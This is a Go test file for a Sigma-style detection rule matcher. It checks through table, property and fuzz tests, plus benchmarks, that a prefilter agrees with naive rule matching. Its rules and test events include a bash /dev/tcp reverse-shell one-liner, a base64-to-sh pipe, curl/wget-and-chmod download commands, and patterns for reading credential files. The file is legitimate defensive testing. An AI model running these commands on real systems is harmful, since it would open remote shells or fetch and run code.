package sigma

import (
	"fmt"
	"sort"
	"strings"
	"testing"

	"github.com/conor-sometimes/banken/internal/event"
	"pgregory.net/rapid"
)

// naiveMatch is the obvious O(rules) reference: run every rule's
// authoritative Match. The whole point of Matcher is to return exactly this
// set for every event while touching far fewer rules, so these two must
// never disagree.
func naiveMatch(rules []*Rule, ev event.Event) []string {
	names := make([]string, 0, len(rules))
	for _, r := range rules {
		if r.Match(ev) {
			names = append(names, r.Name)
		}
	}
	sort.Strings(names)
	return names
}

func matcherNames(m *Matcher, ev event.Event) []string {
	names := make([]string, 0, m.Len())
	for _, r := range m.Match(ev) {
		names = append(names, r.Name)
	}
	sort.Strings(names)
	return names
}

// corpus is a spread of rule shapes that exercise every prefilter path:
// plain contains/endswith, equality, |all, regexp (wild), negation,
// multi-selection and/or, and "N of" quantifiers.
func corpus(t testing.TB) []*Rule {
	t.Helper()
	ymls := map[string]string{
		"reverse_shell": `detection:
  sh:
    Image|endswith: [/bash, /sh, /dash]
  net:
    CommandLine|contains: [/dev/tcp/, 'nc -e', 'ncat --exec']
  condition: sh and net`,
		"cred_read": `detection:
  sel:
    TargetFilename|contains: [/etc/shadow, id_rsa, .aws/credentials]
  condition: sel`,
		"download_tmp": `detection:
  dl:
    Image|endswith: [/curl, /wget]
  tmp:
    CommandLine|contains: /tmp/
  condition: dl and tmp`,
		"regexp_ip": `detection:
  ip:
    CommandLine|re: 'https?://(\d{1,3}\.){3}\d{1,3}'
  condition: ip`,
		"not_allowlisted": `detection:
  danger:
    CommandLine|contains: curl
  allow:
    CommandLine|contains: 'curl https://updates.internal/'
  condition: danger and not allow`,
		"all_mods": `detection:
  sel:
    CommandLine|contains|all: [base64, ' -d', ' | sh']
  condition: sel`,
		"quant": `detection:
  a:
    CommandLine|contains: wget
  b:
    CommandLine|contains: chmod
  c:
    CommandLine|contains: '+x'
  condition: 2 of them`,
		"equals_user": `detection:
  sel:
    User: root
    Image|endswith: /id
  condition: sel`,
		"pure_not": `detection:
  sel:
    Image|endswith: /never-ever-matches-xyz
  condition: not sel`,
	}
	rules := make([]*Rule, 0, len(ymls))
	for name, y := range ymls {
		r := compileOK(t, y)
		r.Name = name
		rules = append(rules, r)
	}
	sort.Slice(rules, func(i, j int) bool { return rules[i].Name < rules[j].Name })
	return rules
}

func TestMatcherEquivalenceTable(t *testing.T) {
	rules := corpus(t)
	m := NewMatcher(rules)
	cases := []event.Event{
		{},
		{Image: "/usr/bin/bash", CommandLine: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{Image: "/bin/cat", TargetFilename: "/home/u/.ssh/id_rsa"},
		{Image: "/usr/bin/curl", CommandLine: "curl http://1.2.3.4/x -o /tmp/x"},
		{CommandLine: "echo aGVsbG8= | base64 -d | sh"},
		{CommandLine: "wget http://x/y && chmod +x y"},
		{Image: "/usr/bin/id", User: "root"},
		{CommandLine: "curl https://updates.internal/pkg"}, // allowlisted -> not_allowlisted must NOT fire
		{CommandLine: "curl http://evil/x"},                // not allowlisted -> fires
		{Image: "/usr/bin/python3", CommandLine: "nothing interesting here"},
	}
	for i, ev := range cases {
		want := naiveMatch(rules, ev)
		got := matcherNames(m, ev)
		if !equalStrs(want, got) {
			t.Errorf("case %d %+v:\n  naive  = %v\n  matcher= %v", i, ev, want, got)
		}
	}
}

// TestMatcherEquivalenceProperty is the real guarantee: for random events
// built from a vocabulary that includes every rule's literals (and junk),
// the prefiltered matcher returns exactly what naive matching does. A
// divergence here would be a silently skipped (or spuriously added)
// detection.
func TestMatcherEquivalenceProperty(t *testing.T) {
	rules := corpus(t)
	m := NewMatcher(rules)

	// Fragments drawn from the rules' own literals plus noise, so random
	// events land on, near, and far from real matches.
	frags := []string{
		"/bash", "/sh", "/curl", "/wget", "/id", "/dev/tcp/", "nc -e",
		"/etc/shadow", "id_rsa", ".aws/credentials", "/tmp/", "base64",
		" -d", " | sh", "wget", "chmod", "+x", "curl",
		"https://updates.internal/", "http://1.2.3.4/x", "root",
		" ", "/", "x", "日本語", "\x00", "ncat --exec",
	}
	users := []string{"", "root", "1000", "daemon"}

	rapid.Check(t, func(rt *rapid.T) {
		build := func() string {
			n := rapid.IntRange(0, 6).Draw(rt, "n")
			var b strings.Builder
			for i := 0; i < n; i++ {
				b.WriteString(rapid.SampledFrom(frags).Draw(rt, "frag"))
			}
			return b.String()
		}
		ev := event.Event{
			Image:            build(),
			CommandLine:      build(),
			ParentImage:      build(),
			TargetFilename:   build(),
			CurrentDirectory: build(),
			User:             rapid.SampledFrom(users).Draw(rt, "user"),
		}
		want := naiveMatch(rules, ev)
		got := matcherNames(m, ev)
		if !equalStrs(want, got) {
			rt.Fatalf("divergence on %+v:\n  naive  = %v\n  matcher= %v", ev, want, got)
		}
	})
}

func TestMatcherEmpty(t *testing.T) {
	m := NewMatcher(nil)
	if got := m.Match(event.Event{CommandLine: "anything"}); got != nil {
		t.Errorf("empty matcher returned %v, want nil", got)
	}
	if m.Len() != 0 {
		t.Errorf("Len = %d, want 0", m.Len())
	}
}

// TestMatcherAlwaysRules checks that a regexp-only rule and a negation rule
// (neither gated by a literal that must be present) are always evaluated,
// including on an event whose fields contain none of any rule's literals.
func TestMatcherAlwaysRules(t *testing.T) {
	rules := corpus(t)
	m := NewMatcher(rules)
	// An event with no rule literals at all: only the always-on rules can
	// fire. pure_not fires (its selection never matches, so `not sel` is
	// true); regexp_ip does not (no URL present).
	ev := event.Event{CommandLine: "zzz nothing zzz"}
	got := matcherNames(m, ev)
	want := naiveMatch(rules, ev)
	if !equalStrs(want, got) {
		t.Fatalf("always-rule event:\n  naive  = %v\n  matcher= %v", want, got)
	}
	foundPureNot := false
	for _, n := range got {
		if n == "pure_not" {
			foundPureNot = true
		}
	}
	if !foundPureNot {
		t.Error("pure_not (a `not` rule) should fire on an event missing its literal")
	}
}

// FuzzMatcherEquivalence is the prefilter's safety net: for an arbitrary
// rule and arbitrary event fields, the compiled matcher must return the same
// verdict as the authoritative Rule.Match. A false negative (Match says fire,
// matcher skips) would be a silently dropped detection -- the worst possible
// bug in a detector -- so the fuzzer hunts for exactly that.
func FuzzMatcherEquivalence(f *testing.F) {
	f.Add("detection:\n  s:\n    Image|endswith: /sh\n  condition: s\n", "/bin/sh", "x", "y", "root")
	f.Add("detection:\n  a:\n    CommandLine|contains: wget\n  b:\n    CommandLine|contains: chmod\n  condition: all of them\n", "", "wget x; chmod +x", "", "")
	f.Add("detection:\n  s:\n    CommandLine|re: 'a.*b'\n  f:\n    Image: /x\n  condition: s and not f\n", "/x", "aXXb", "", "")
	f.Add("detection:\n  s:\n    CommandLine|contains|all: [a, b, c]\n  condition: s\n", "", "cba", "", "")

	f.Fuzz(func(t *testing.T, ruleYAML, image, cmd, target, user string) {
		rule, err := Compile([]byte(ruleYAML))
		if err != nil {
			return // only well-formed rules are interesting here
		}
		rule.Name = "fuzz"
		m := NewMatcher([]*Rule{rule})
		ev := event.Event{Image: image, CommandLine: cmd, TargetFilename: target, User: user}

		authoritative := rule.Match(ev)
		viaMatcher := len(m.Match(ev)) > 0
		if authoritative != viaMatcher {
			t.Fatalf("prefilter disagrees with Rule.Match\n  rule=%q\n  ev=%+v\n  Match=%v matcher=%v",
				ruleYAML, ev, authoritative, viaMatcher)
		}
	})
}

func equalStrs(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// --- benchmarks: the scaling story (naive O(rules) vs the prefilter) ---

// benchRules builds n rules with *distinct* literals, the way a real rule
// tree grows: rule i keys off a command token and a filename token unique to
// it. This is the case the prefilter is built for -- an event carries at most
// a few rules' tokens, so the candidate set stays small however large n is,
// while naive matching still visits every rule.
func benchRules(tb testing.TB, n int) []*Rule {
	tb.Helper()
	rules := make([]*Rule, 0, n)
	for i := 0; i < n; i++ {
		y := fmt.Sprintf(`detection:
  cmd:
    CommandLine|contains: evilcmd-%d-marker
  file:
    TargetFilename|contains: /opt/mal-%d/payload
  condition: cmd or file`, i, i)
		r := compileOK(tb, y)
		r.Name = fmt.Sprintf("rule_%d", i)
		rules = append(rules, r)
	}
	return rules
}

// benchEvents each carry one low-index rule's token (a realistic hit) plus a
// clean event that matches nothing -- the common case on a quiet host.
var benchEvents = []event.Event{
	{Image: "/usr/bin/bash", CommandLine: "sh -c 'evilcmd-3-marker now'"},
	{Image: "/usr/bin/python3", CommandLine: "python3 -c 'print(1)'"}, // matches nothing
	{Image: "/bin/cp", TargetFilename: "/opt/mal-7/payload"},
	{Image: "/usr/bin/curl", CommandLine: "curl https://example.com/ -o /tmp/x"}, // clean
}

func benchmarkMatcher(b *testing.B, n int) {
	rules := benchRules(b, n)
	m := NewMatcher(rules)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = m.Match(benchEvents[i%len(benchEvents)])
	}
}

func benchmarkNaive(b *testing.B, n int) {
	rules := benchRules(b, n)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ev := benchEvents[i%len(benchEvents)]
		for _, r := range rules {
			_ = r.Match(ev)
		}
	}
}

func BenchmarkMatcher100(b *testing.B)   { benchmarkMatcher(b, 100) }
func BenchmarkMatcher1000(b *testing.B)  { benchmarkMatcher(b, 1000) }
func BenchmarkMatcher10000(b *testing.B) { benchmarkMatcher(b, 10000) }
func BenchmarkNaive100(b *testing.B)     { benchmarkNaive(b, 100) }
func BenchmarkNaive1000(b *testing.B)    { benchmarkNaive(b, 1000) }
func BenchmarkNaive10000(b *testing.B)   { benchmarkNaive(b, 10000) }
